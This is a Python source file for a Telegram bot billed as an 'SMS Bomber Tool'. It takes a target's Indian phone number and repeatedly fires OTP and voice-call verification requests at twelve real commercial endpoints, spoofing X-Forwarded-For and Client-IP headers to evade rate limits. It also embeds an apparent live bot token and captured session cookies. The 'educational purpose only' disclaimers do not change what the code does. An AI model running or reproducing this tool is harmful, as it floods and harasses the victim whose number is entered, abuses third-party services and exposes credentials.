import asyncio
import aiohttp
import urllib.parse
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from telegram.constants import ParseMode

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
PHONE, IP, CONFIRM = range(3)

# Store user data temporarily
user_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send a message when the command /start is issued."""
    await update.message.reply_text(
        "📱 *SMS Bomber Tool*\n"
        "Decoded By JwtSmith | @JwtSmith\n\n"
        "⚠️ *Educational Purpose Only*\n"
        "Please use this tool responsibly and only for educational purposes.\n\n"
        "Type /bomb to start the SMS bomber.\n"
        "Type /cancel to stop at any time.",
        parse_mode=ParseMode.MARKDOWN
    )
    return ConversationHandler.END

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the bombing process."""
    await update.message.reply_text(
        "🔢 *Enter the 10-digit phone number (without +91):*\n"
        "Example: 9876543210\n\n"
        "Type /cancel to stop.",
        parse_mode=ParseMode.MARKDOWN
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get the phone number from user."""
    phone_number = update.message.text.strip()
    
    if not phone_number.isdigit() or len(phone_number) != 10:
        await update.message.reply_text(
            "❌ Invalid phone number! Please enter a valid 10-digit number (without +91).\n"
            "Example: 9876543210\n\n"
            "Type /cancel to stop."
        )
        return PHONE
    
    user_data['phone'] = phone_number
    
    # Ask for IP address (optional)
    keyboard = [['Use Default IP (192.168.1.1)', 'Enter Custom IP']]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    
    await update.message.reply_text(
        f"📱 Phone Number: *{phone_number}*\n\n"
        "🌐 *Choose IP Address option:*\n"
        "1. Use Default IP (192.168.1.1)\n"
        "2. Enter Custom IP\n\n"
        "You can type /cancel anytime to stop.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    return IP

async def get_ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get the IP address from user."""
    choice = update.message.text
    phone_number = user_data['phone']
    
    if choice == 'Use Default IP (192.168.1.1)':
        user_data['ip'] = "192.168.1.1"
    else:
        # User will enter custom IP in next message
        await update.message.reply_text(
            "🌐 *Enter the IP address to use:*\n"
            "Example: 192.168.1.100\n\n"
            "Type /cancel to stop.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=ReplyKeyboardRemove()
        )
        return IP
    
    # Show confirmation
    keyboard = [['✅ Start Bombing', '❌ Cancel']]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    
    await update.message.reply_text(
        f"📋 *Confirmation:*\n"
        f"• Phone Number: *{phone_number}*\n"
        f"• IP Address: *{user_data['ip']}*\n\n"
        "⚠️ *Warning:* This will send multiple OTP requests.\n"
        "Use only for educational purposes!\n\n"
        "Select an option:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    return CONFIRM

async def get_custom_ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get custom IP address."""
    ip_address = update.message.text.strip()
    user_data['ip'] = ip_address
    phone_number = user_data['phone']
    
    # Show confirmation
    keyboard = [['✅ Start Bombing', '❌ Cancel']]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    
    await update.message.reply_text(
        f"📋 *Confirmation:*\n"
        f"• Phone Number: *{phone_number}*\n"
        f"• IP Address: *{ip_address}*\n\n"
        "⚠️ *Warning:* This will send multiple OTP requests.\n"
        "Use only for educational purposes!\n\n"
        "Select an option:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    return CONFIRM

async def confirm_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle confirmation."""
    choice = update.message.text
    phone_number = user_data['phone']
    ip_address = user_data['ip']
    
    if choice == '❌ Cancel':
        await update.message.reply_text(
            "❌ Bombing cancelled.",
            reply_markup=ReplyKeyboardRemove()
        )
        return ConversationHandler.END
    
    # Start bombing
    await update.message.reply_text(
        f"🚀 *Starting SMS Bomber...*\n"
        f"• Target: *{phone_number}*\n"
        f"• IP: *{ip_address}*\n\n"
        "🔄 Tool Running...",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=ReplyKeyboardRemove()
    )
    
    # Run the bombing in background
    asyncio.create_task(send_otp_requests(update, context, phone_number, ip_address))
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text(
        "❌ Operation cancelled.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

# API Request Functions
async def send_request(session, api, phone_number, ip_address):
    try:
        if api["method"] == "POST":
            if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in api["payload"].items())
                api["headers"]["Content-Length"] = str(len(payload_str.encode('utf-8')))
                response = await session.post(api["endpoint"], data=payload_str, headers=api["headers"], timeout=1, ssl=False)
            else:
                response = await session.post(api["endpoint"], json=api["payload"], headers=api["headers"], timeout=1, ssl=False)
        else:
            return None, api
        status_code = response.status
        
        return status_code, api
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        return None, api

async def send_otp_requests(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, ip_address: str):
    """Modified send_otp_requests to work with Telegram."""
    apis = [
        {
            "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "payload": {
                "mobileNo": phone_number,
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "identifier": "home",
                "mlang": "en",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "alang": "en",
                "country_code": "IN",
                "vlang": "en",
                "origin": "https://www.hungama.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.hungama.com/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Mobilenumber": phone_number,
                "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
                "Oauthtoken": "",
                "AppVersion": "245",
                "ApiVersion": "6.2.55",
                "DeviceType": "Android",
                "DeviceId": "44098bdebb2dc047",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "payload": {"api": "send_otp", "brand": "dayco", "mob": phone_number, "resend_otp": "resend_otp"},
            "headers": {
                "Host": "ekyc.daycoindia.com",
                "sec-ch-ua-platform": "\"Android\"",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "Origin": "https://ekyc.daycoindia.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                "Priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "payload": {
                "app_version": "7.10.51",
                "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
                "course": "",
                "phone_number": phone_number,
                "language": "en",
                "udid": "b751fb63c0ae17ba",
                "class": "",
                "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
            },
            "headers": {
                "version_code": "1160",
                "has_upi": "false",
                "device_model": "ASUS_I005DA",
                "android_sdk_version": "28",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "payload": {"phone": phone_number, "countryCode": "IN"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                "origin": "https://www.nobroker.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.nobroker.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address,
                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaHp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
            }
        },
        {
            "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "payload": {"mobileNumber": phone_number},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": "Android",
                "authorization": "Bearer null",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "sec-ch-ua-mobile": "?1",
                "origin": "https://app.shiprocket.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.shiprocket.in/",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "payload": {"phone": phone_number, "applSource": "", "isOtpViaCallAtLogin": "true"},
            "headers": {
                "Content-Type": "application/json",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method": "POST",
            "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone_number},
            "headers": {
                "Host": "api.penpencil.co",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "payload": {"number": phone_number, "is_corporate_user": False, "otp_on_call": True},
            "headers": {
                "Host": "www.1mg.com",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "payload": {"mobile": phone_number},
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
                "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
            "method": "POST",
            "payload": {"phone_number": {"number": phone_number, "country_code": "+91"}},
            "headers": {
                "Host": "api.kpnfresh.com",
                "sec-ch-ua-platform": "\"Android\"",
                "cache": "no-store",
                "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                "x-channel-id": "WEB",
                "sec-ch-ua-mobile": "?1",
                "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "content-type": "application/json",
                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
                "accept": "*/*",
                "origin": "https://www.kpnfresh.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.kpnfresh.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "priority": "u=1, i",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        },
        {
            "endpoint": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "payload": {"mobile_number": phone_number},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
                "Host": "api.servetel.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "X-Forwarded-For": ip_address,
                "Client-IP": ip_address
            }
        }
    ]

    total_requests = 0
    successful_requests = 0
    failed_requests = 0

    async with aiohttp.ClientSession() as session:
        try:
            while True:
                tasks = [send_request(session, api, phone_number, ip_address) for api in apis]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                new_apis = []
                for result in results:
                    if isinstance(result, Exception):
                        failed_requests += 1
                        continue
                    
                    total_requests += 1
                    status_code, api = result
                    
                    if status_code in [200, 201]:
                        new_apis.append(api)
                        successful_requests += 1
                    elif status_code is not None:
                        failed_requests += 1
                
                apis = new_apis
                if not apis:
                    await update.message.reply_text(
                        f"✅ *Bombing Complete!*\n\n"
                        f"📊 Statistics:\n"
                        f"• Total Requests: {total_requests}\n"
                        f"• Successful: {successful_requests}\n"
                        f"• Failed: {failed_requests}\n\n"
                        "All APIs have been removed due to non-200/201 status codes.",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    break
                
                # Send periodic updates
                if total_requests % 10 == 0:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"🔄 *Still running...*\n\n"
                             f"📊 Current Stats:\n"
                             f"• Total Requests: {total_requests}\n"
                             f"• Successful: {successful_requests}\n"
                             f"• Failed: {failed_requests}\n"
                             f"• Active APIs: {len(apis)}",
                        parse_mode=ParseMode.MARKDOWN
                    )
                
                await asyncio.sleep(0.5)

        except Exception as e:
            await update.message.reply_text(
                f"❌ *Bombing stopped due to error:*\n{str(e)}",
                parse_mode=ParseMode.MARKDOWN
            )
        finally:
            # Send final statistics
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"🎯 *Final Statistics:*\n\n"
                     f"• Total Requests: {total_requests}\n"
                     f"• Successful: {successful_requests}\n"
                     f"• Failed: {failed_requests}\n"
                     f"• Target: {phone_number}\n\n"
                     f"Type /bomb to start again.",
                parse_mode=ParseMode.MARKDOWN
            )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a help message."""
    await update.message.reply_text(
        "📖 *Help Guide*\n\n"
        "*/start* - Start the bot\n"
        "*/bomb* - Start SMS bombing process\n"
        "*/cancel* - Cancel current operation\n"
        "*/help* - Show this help message\n\n"
        "⚠️ *Disclaimer:*\n"
        "This tool is for educational purposes only.\n"
        "Use responsibly and only on numbers you own.\n\n"
        "Created by: @JwtSmith",
        parse_mode=ParseMode.MARKDOWN
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors caused by Updates."""
    logger.warning(f'Update {update} caused error {context.error}')

def main() -> None:
    """Start the bot."""
    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
    TOKEN = "8289114029:AAEJ4gkDj1AqmMwwDBDrYEpqC6hvyQQdDTA"
    
    # Create the Application
    application = Application.builder().token(TOKEN).build()
    
    # Add conversation handler for the bombing process
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('bomb', bomb_command)],
        states={
            PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)
            ],
            IP: [
                MessageHandler(filters.Regex('^Use Default IP'), get_ip),
                MessageHandler(filters.Regex('^Enter Custom IP'), get_ip),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_ip)
            ],
            CONFIRM: [
                MessageHandler(filters.Regex('^(✅ Start Bombing|❌ Cancel)$'), confirm_action)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(conv_handler)
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start the Bot
    print("🤖 Bot is starting...")
    print("📱 SMS Bomber Tool")
    print("🔧 Decoded By JwtSmith | @JwtSmith")
    print("⚠️  Educational Purpose Only")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()